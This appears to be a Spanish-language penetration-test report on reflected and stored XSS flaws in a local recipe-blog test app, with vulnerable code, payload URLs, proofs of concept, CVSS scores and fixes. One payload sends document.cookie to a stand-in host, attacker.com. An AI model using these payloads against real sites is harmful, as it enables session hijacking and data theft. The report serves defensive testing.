# Informe de Análisis de Seguridad - Cross-Site Scripting (XSS)

**Fecha:** 2026-04-30 15:57:27  
**Objetivo:** http://web.dev.local:8082  
**Tipo de análisis:** Cross-Site Scripting (XSS)  
**Estado:** VULNERABILIDADES ENCONTRADAS Y EXPLOTADAS

---

## Resumen Ejecutivo

La aplicación web "Blog de Recetas" en http://web.dev.local:8082 presenta **dos vulnerabilidades XSS críticas** que permiten la inyección y ejecución de código JavaScript arbitrario en el navegador de las víctimas. Ambas vulnerabilidades se originan por el uso inseguro de `document.write()` con datos controlados por el usuario sin ningún tipo de sanitización.

---

## Vulnerabilidades Encontradas

### 1. Reflected XSS - Parámetro `search`

**Severidad:** Alta  
**Tipo:** Reflected XSS (Tipo 1)  
**Vector:** `GET /?search=<payload>`

#### Descripción

El campo de búsqueda de recetas toma el valor del parámetro `search` directamente desde la URL (`URLSearchParams`) y lo inserta en el DOM mediante `document.write()` sin ningún proceso de sanitización o codificación HTML.

#### Código vulnerable

```javascript
const searchTerm = urlParams.get('search');
if (searchTerm) {
    document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
}
```

#### Payload de explotación

```
http://web.dev.local:8082/?search=<script>alert('XSS-Reflected')</script>
http://web.dev.local:8082/?search=</strong><img src=x onerror=alert(document.cookie)>
http://web.dev.local:8082/?search=<svg onload=alert('XSS')>
```

#### Impacto

- Robo de cookies de sesión
- Redirección a sitios maliciosos
- Ejecución de código JavaScript en el contexto del usuario víctima
- Ataques de phishing mediante manipulación del DOM

---

### 2. Stored XSS - Parámetros `name` y `comment`

**Severidad:** Crítica  
**Tipo:** Stored/Persistent XSS (Tipo 2)  
**Vector:** `GET /?name=<payload>&comment=<payload>`

#### Descripción

El sistema de comentarios almacena los valores de `name` y `comment` en el `localStorage` del navegador sin sanitizar. Al recuperarlos para mostrarlos, los inserta directamente en el DOM con `document.write()`, permitiendo XSS persistente en el navegador de cada usuario que visite la página en ese dispositivo.

#### Código vulnerable

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');
if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
}

// Al renderizar:
document.write('<div class="comment-author">' + c.name + '</div>');
document.write('<div>' + c.comment + '</div>');
```

#### Payload de explotación

```
http://web.dev.local:8082/?name=Atacante&comment=<script>alert('XSS-Stored')</script>
http://web.dev.local:8082/?name=<img src=x onerror=alert(1)>&comment=Comentario normal
http://web.dev.local:8082/?name=Test&comment=<svg onload=fetch('http://attacker.com/steal?c='+document.cookie)>
```

#### Impacto

- El payload persiste en el `localStorage` y se ejecuta en cada visita posterior
- Afecta a todos los usuarios del mismo navegador/dispositivo
- Permite robo de información, keylogging, defacement del contenido

---

## Prueba de Concepto (PoC)

### PoC 1 - Reflected XSS

**URL de ataque:**
```
http://web.dev.local:8082/?search=</strong><script>alert('XSS-Reflected-PoC')</script>
```

**Comportamiento esperado:** Al cargar la URL, el navegador ejecuta el script y muestra un alert con el mensaje `XSS-Reflected-PoC`, confirmando la ejecución de código arbitrario.

### PoC 2 - Stored XSS

**URL de ataque:**
```
http://web.dev.local:8082/?name=Hacker&comment=<script>document.body.style.background='red';alert('Stored XSS!')</script>
```

**Comportamiento esperado:** El payload se almacena en `localStorage`. En cada recarga de la página, el script se ejecuta automáticamente al renderizar los comentarios.

---

## Análisis Técnico

| Parámetro | Tipo XSS | Método de inyección | Sanitización | Codificación |
|-----------|----------|---------------------|--------------|--------------|
| `search`  | Reflected | `document.write()` | ❌ Ninguna | ❌ Ninguna |
| `name`    | Stored    | `document.write()` + localStorage | ❌ Ninguna | ❌ Ninguna |
| `comment` | Stored    | `document.write()` + localStorage | ❌ Ninguna | ❌ Ninguna |

---

## Recomendaciones

### Solución inmediata

1. **Reemplazar `document.write()`** por métodos seguros como `textContent` o `createElement`:

```javascript
// INSEGURO:
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');

// SEGURO:
const p = document.createElement('p');
const strong = document.createElement('strong');
strong.textContent = searchTerm; // textContent escapa HTML automáticamente
p.appendChild(document.createTextNode('Resultados para: '));
p.appendChild(strong);
container.appendChild(p);
```

2. **Sanitizar entradas** usando una biblioteca como DOMPurify antes de almacenar o renderizar:

```javascript
import DOMPurify from 'dompurify';
const safeInput = DOMPurify.sanitize(userInput);
```

3. **Implementar Content Security Policy (CSP)** en las cabeceras HTTP:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

4. **Validar y codificar** todos los datos de usuario antes de su uso:
   - Usar `encodeURIComponent()` para datos en URLs
   - Usar `innerHTML` solo con contenido sanitizado
   - Preferir `textContent` sobre `innerHTML` cuando no se necesite HTML

### Medidas adicionales

- Implementar HTTPOnly y Secure flags en cookies de sesión
- Añadir cabecera `X-XSS-Protection: 1; mode=block`
- Realizar auditorías de seguridad periódicas
- Implementar un WAF (Web Application Firewall)

---

## Conclusión

La aplicación presenta vulnerabilidades XSS graves tanto de tipo Reflected como Stored. La causa raíz es el uso de `document.write()` con datos de usuario no sanitizados. Se recomienda corrección inmediata dado que estas vulnerabilidades permiten la ejecución de código JavaScript arbitrario en el contexto de los usuarios, pudiendo comprometer cuentas, robar información sensible y realizar acciones en nombre de las víctimas.

**CVSS Score estimado:**
- Reflected XSS: 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
- Stored XSS: 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)
